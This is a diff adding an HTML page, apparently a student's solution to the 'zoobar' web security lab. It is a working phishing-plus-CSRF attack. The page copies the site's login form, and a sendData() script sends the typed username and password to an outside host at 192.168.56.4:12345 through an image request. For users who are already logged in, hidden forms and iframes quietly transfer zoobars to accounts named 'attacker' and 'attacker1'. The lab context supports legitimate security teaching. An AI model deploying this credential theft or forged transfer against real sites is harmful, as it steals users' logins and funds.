@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="utf-8">
+        <style>
+          body {
+            background-color: #cccccc;
+            font-family: sans-serif;
+            margin-left: 25px;
+            margin-right: 25px;
+            font-size: smaller;
+          }
+          .centerpiece {
+            margin: 0 auto;
+            width: 500px;
+            height: 255px;
+            border: 2px solid #333333;
+            font-size: 10pt;
+          }
+          .log {
+            width: 500px;
+          }
+          h1, h2, h1 a { text-align: center; color: #555555; }
+          h1 a { text-decoration: none; }
+          h1 { margin: 0em 100px 0em 100px; }
+          h2 { margin: 0em 1em 1em 1em; font-size: 1em; }
+          .centerpiece textarea { width: 90%; height: 100px; }
+          .centerpiece td { height: 0px; }
+          .centerpiece td.main { height: 130px; }
+          #login { background-image: url(http://localhost:8080/zoobar/media/lion_sleeping.jpg); font-weight: bold; }
+          #login table { margin: 18px 30px 0px 30px; }
+          .profilecontainer {
+            height: 100px;
+            margin: 5px;
+            border-top: 1px solid #333333;
+          }
+          #warning { color: #A00000; font-weight: bold; }
+          .footer { text-align: center; }
+          #header {
+            text-align: right;
+            position: absolute;
+            right: 1em;
+            font-size: smaller;
+          }
+        </style>
+        <title>
+          Login - Zoobar Foundation
+        </title>
+    </head>
+    <body>
+
+      <div id="mydiv" style="visibility:hidden;">
+      <h1><a href="#">Zoobar Foundation for Awesome
+                      Thinking</a></h1>
+      <h2>Supporting the brightest
+          minds of the new world order</h2>
+
+      <div id="login" class="centerpiece">
+        <form name="loginform" method="POST" action="http://localhost:8080/zoobar/index.cgi/login" onsubmit="sendData();" target="kurisu">
+          <table>
+            <tr>
+              <td>Username:</td>
+              <td><input type="text" name="login_username" size="20" autocomplete="no" value=""></td>
+            </tr>
+            <tr>
+              <td>Password:</td>
+              <td colspan=2>
+                <input type="password" name="login_password" size=20 autocomplete="no">
+                <input type="submit" name="submit_login" value="Log in">
+                <input type="submit" name="submit_registration" value="Register">
+              </td>
+            </tr>
+          </table>
+          <input type="hidden" name="nexturl" value="http://localhost:8080/zoobar/index.cgi/">
+      </form>
+    </div>
+    <div class="footer warning">
+    </div>
+  </div>
+
+  <iframe name="mikasa" style="visibility:hidden;height:2pt;width:2pt;" src="http://localhost:8080/zoobar/index.cgi/transfer"> </iframe>
+
+  <form method="POST" name="transferform" action="http://localhost:8080/zoobar/index.cgi/transfer"  target="mikasa" onsubmit="setTimeout(function(){moodle(); return false;}, 1000);" style="visibility:hidden;">
+    <input id="bars" name="zoobars"  type="text" value=1 size=5>
+    <input id="receiver" name=recipient type=text value="attacker" size=10>
+    <input id="attack" type="submit" name="submission" value="Send">
+  </form>
+
+    <script id="myscript" type="text/javascript" src='http://localhost:8080/zoobar/index.cgi/zoobarjs'></script>
+    <script>
+
+      document.addEventListener("DOMContentLoaded", function(){
+        if ((document.getElementById("myscript").getAttribute('src') == "http://localhost:8080/zoobar/index.cgi/zoobarjs") && (typeof(myZoobars) == "number")){
+          //console.log("User Logged in");
+          document.getElementById('attack').click();
+        }
+        else {
+          //console.log("User Not logged-in");
+          document.getElementById('mydiv').style.visibility = "visible";
+        }
+      });
+
+
+      function sendData() {
+        payload = encodeURIComponent(document.getElementsByName("login_username")[0].value) + "," +
+                  encodeURIComponent(document.getElementsByName("login_password")[0].value);
+        //console.log(payload);
+        (new Image()).src="http://192.168.56.4:12345?payload=" + payload + "&roll=14785&random="+Math.random()+"&timestamp="+Date.now();
+
+        document.getElementsByName("kurisu")[0].addEventListener("load", function(){
+          window.location.href = "http://localhost:8080/zoobar/index.cgi/";
+        }, false);
+      }
+
+      var i = 1;
+      function moodle() {
+        if (i == 1)
+        {
+          i--;
+          document.getElementById('bars').value = 9;
+          document.getElementById('receiver').value = "attacker1";
+          document.getElementById('attack').click();
+        }
+        else if (i == 0){
+          window.location.href = 'http://moodle.cse.iitk.ac.in/';
+        }
+      }
+    </script>
+
+    <iframe name="kurisu" style="visibility:hidden;height:2pt;width:2pt;" src="http://localhost:8080/zoobar/index.cgi/"> </iframe>
+
+  </body>
+</html>
